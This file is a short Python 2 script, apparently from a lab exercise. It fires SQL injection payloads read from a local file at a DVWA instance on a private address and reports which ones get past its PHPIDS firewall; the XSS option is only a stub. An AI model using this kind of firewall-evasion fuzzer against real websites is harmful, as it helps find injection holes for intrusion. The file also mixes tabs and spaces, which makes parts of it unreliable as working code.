import urllib, urllib2, cookielib

username = 'admin'
password = 'password'

#read all payload and sort them line by line without \n
with open("/root/Desktop/payloads") as f:
	payloads = f.read().splitlines()

sufix = "&Submit=Submit#"

menu = {}
menu['1']="SQLi"
menu['2']="XSS"
menu['3']="Exit"
while True:
  options=menu.keys()
  options.sort()
  for entry in options:
	print entry, menu[entry]

  #Menu options
  selection = raw_input("Please select:")
  if selection == '1':
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

#        login_data = urllib.urlencode({'username' : username, 'password' : password})
        opener.open('http://192.168.57.100/index.php')
	opener2.open('http://192.168.57.100/security.php?phpids=on')
	# Test each payload from the file
	count = 0
	for payload in payloads:
		count += 1
		resp = opener.open('http://192.168.57.100/vulnerabilities/sqli/?id='+urllib.quote_plus(payload)+sufix) 
		print "Payload " + str(count) + ": " + payload + " passed to the web app"
		response = resp.read()
		# Check if WAF has been triggered
		if "Hacking" in response:
			print "Payload " + str(count) + ": " + payload + " did not go through"
			print "-----------------------------------"
		else: 
			print "Payload " + str(count) + ": " + payload + " succesfull"
		      	print "-----------------------------------"
#		print response
#	break
  elif selection == '2':
	print "XSS script now needs to run"
  elif selection == '3':
	break
  else:
	print "Unknown option selected!"


#print resp.read()
